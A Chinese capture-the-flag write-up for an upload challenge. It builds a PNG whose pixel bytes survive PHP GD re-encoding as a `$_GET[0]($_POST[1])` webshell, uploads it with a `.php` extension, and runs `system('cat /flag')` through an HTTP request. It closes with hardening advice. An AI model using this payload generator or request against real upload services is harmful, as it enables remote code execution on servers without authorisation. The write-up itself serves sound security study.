# ez_upload

## 题目简述

上传接口依据客户端提供的 MIME 类型调用 PHP GD 解码图片，再重新编码保存，属于二次渲染。普通追加在图片尾部的 PHP 代码会被丢弃，但服务端沿用原始文件扩展名，且存在一种特制 PNG：其像素经 `imagepng()` 重编码后，压缩数据中仍出现可执行 PHP 片段。将它以 `.php` 扩展名上传即可形成图片马。

## 解题过程

服务端只在 `$_FILES['file']['type']` 上选择 `imagecreatefrompng()`，保存路径却取上传文件名的扩展名：

```php
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$filepath = $user_dir . md5($_FILES['file']['name']) . '.' . $ext;
imagepng($source, $filepath);
```

下列生成器把已计算好的 RGB 字节写入 32×32 PNG。该字节布局专门适配目标 PHP 7.4/GD 的 PNG 重编码，生成后的文件在二次渲染后仍包含等价于 `$_GET[0]($_POST[1])` 的短 PHP 调用器：

```php
<?php
$p = [
    0xa3,0x9f,0x67,0xf7,0x0e,0x93,0x1b,0x23,
    0xbe,0x2c,0x8a,0xd0,0x80,0xf9,0xe1,0xae,
    0x22,0xf6,0xd9,0x43,0x5d,0xfb,0xae,0xcc,
    0x5a,0x01,0xdc,0x5a,0x01,0xdc,0xa3,0x9f,
    0x67,0xa5,0xbe,0x5f,0x76,0x74,0x5a,0x4c,
    0xa1,0x3f,0x7a,0xbf,0x30,0x6b,0x88,0x2d,
    0x60,0x65,0x7d,0x52,0x9d,0xad,0x88,0xa1,
    0x66,0x44,0x50,0x33
];

$img = imagecreatetruecolor(32, 32);
for ($i = 0; $i < count($p); $i += 3) {
    $color = imagecolorallocate($img, $p[$i], $p[$i+1], $p[$i+2]);
    imagesetpixel($img, intdiv($i, 3), 0, $color);
}
imagepng($img, 'payload.png');
?>
```

上传时把 multipart 文件名改为 `payload.php`，但文件 part 的 `Content-Type` 保持 `image/png`。接口返回哈希化保存路径。随后请求：

```http
POST /uploads/<user-hash>/<file-hash>.php?0=system HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

1=cat+/flag
```

PHP 解释器处理 `.php` 文件，参数 0 选择 `system`，参数 1 作为命令。响应会混有 PNG 二进制和命令输出，搜索 `0xGame{` 可定位到：

```text
0xGame{4611f622-8577-4ac4-8f85-0b787730800c}
```

## 方法总结

二次渲染能清除普通尾部附加代码，但不能弥补“客户端可控 MIME + 原样保留可执行扩展名 + 上传目录可由 Web 访问”的组合缺陷。应由服务端识别真实格式、生成固定安全扩展名、把上传目录置于脚本执行范围之外，并使用随机对象名与独立静态文件域。
